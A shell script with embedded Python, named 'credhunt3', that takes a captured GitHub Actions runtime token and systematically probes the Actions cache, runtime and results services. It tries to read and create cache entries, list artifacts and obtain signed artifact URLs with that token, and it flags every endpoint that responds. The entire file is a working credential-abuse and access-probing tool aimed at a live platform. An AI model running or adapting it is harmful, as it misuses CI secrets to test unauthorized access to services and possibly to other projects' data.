#!/usr/bin/env bash
# credhunt3: systematic TWIRP/v1 enumeration across the three signed hosts.
set -u

echo "== [0] token claims snapshot (from prior round, for reference)"
echo "scp=Actions.Results/Runner/UploadArtifacts per-job GUIDs + Actions.GenericRead:0000... (unbound)"

TOK=$(cat reports/runtime-token.txt 2>/dev/null || true)
if [ -z "$TOK" ]; then
  echo "no token (should not happen in action step)"
  exit 0
fi
CACHE_URL=$(python3 -c "import json;print(json.load(open('reports/action-env.json')).get('ACTIONS_CACHE_URL',''))")
RUNTIME_URL=$(python3 -c "import json;print(json.load(open('reports/action-env.json')).get('ACTIONS_RUNTIME_URL',''))")
RESULTS_URL=$(python3 -c "import json;print(json.load(open('reports/action-env.json')).get('ACTIONS_RESULTS_URL',''))")

echo "== [1] TWIRP matrix: host x service/method"
CACHE_URL="$CACHE_URL" RUNTIME_URL="$RUNTIME_URL" RESULTS_URL="$RESULTS_URL" TOK="$TOK" RUN_ID="$GITHUB_RUN_ID" python3 - <<'EOF'
import json, os, time, urllib.request, urllib.error

CU = os.environ['CACHE_URL']; RU = os.environ['RUNTIME_URL']
RE = os.environ['RESULTS_URL']; TOK = os.environ['TOK']
RUN = os.environ['RUN_ID']
VER = 'deadbeef00000000000000000000000000000000000000000000000000000000'
HOSTS = [('cache', CU), ('runtime', RU), ('results', RE)]
CALLS = [
    ('github.actions.results.api.v1.CacheService', 'GetCacheEntry', {'key': 'probe-x', 'version': VER}),
    ('github.actions.results.api.v1.CacheService', 'CreateCacheEntry', {'key': 'probe-own-' + RUN, 'version': VER, 'size': 10}),
    ('github.actions.results.api.v1.CacheService', 'GetCacheEntryDownloadURL', {'key': 'probe-x', 'version': VER}),
    ('github.actions.results.api.v1.ArtifactService', 'ListArtifacts', {'workflow_run_id': int(RUN), 'repository_id': 1359293399}),
    ('github.actions.results.api.v1.ArtifactService', 'ListArtifacts', {'workflowRunId': int(RUN)}),
    ('github.actions.results.api.v1.ArtifactService', 'GetSignedArtifactURL', {'artifact_id': 1}),
    ('actions.services.cache.v1.CacheService', 'GetCacheEntry', {'key': 'probe-x', 'version': VER}),
]
hits = []
for hname, base in HOSTS:
    if not base:
        continue
    for svc, method, body in CALLS:
        url = base + 'twirp/' + svc + '/' + method
        req = urllib.request.Request(url, data=json.dumps(body).encode(), method='POST',
            headers={'Authorization': 'Bearer ' + TOK, 'Content-Type': 'application/json',
                     'Accept': 'application/json'})
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                code, txt = r.status, r.read(250).decode(errors='replace')
        except urllib.error.HTTPError as e:
            code, txt = e.code, e.read(250).decode(errors='replace')
        except Exception as e:
            code, txt = 'ERR', str(e)[:80]
        marker = ''
        if code not in (404, '404') and 'page not found' not in txt and "aren't available" not in txt:
            marker = '   <<< LIVE ENDPOINT'
            hits.append((hname, svc, method, code, txt))
        print(f'{code} [{hname}] {svc}/{method} :: {txt[:150]}{marker}')
        time.sleep(1)

print('== LIVE SUMMARY ==')
for h in hits:
    print(h)

print('== [2] v1 API with AzDO-style headers on cache host (X-Vss-SessionToken / Accept)')
for path, body in [('_apis/artifactcache/caches', json.dumps({'key': 'probe-own-' + RUN, 'version': VER, 'size': 10})),
                   ('_apis/artifactcache/cache?keys=probe-x&version=' + VER, None)]:
    m = 'POST' if body else 'GET'
    for hdr_name in ['X-Vss-SessionToken', 'Authorization']:
        headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
        if hdr_name == 'Authorization':
            headers['Authorization'] = 'Bearer ' + TOK
        else:
            headers[hdr_name] = TOK
        req = urllib.request.Request(CU + path, data=body.encode() if body else None, method=m, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                code, txt = r.status, r.read(250).decode(errors='replace')
        except urllib.error.HTTPError as e:
            code, txt = e.code, e.read(250).decode(errors='replace')
        except Exception as e:
            code, txt = 'ERR', str(e)[:80]
        print(f'{code} {m} {path} [{hdr_name}] :: {txt[:120]}')
        time.sleep(1)
print('CREDHUNT3 DONE')
EOF
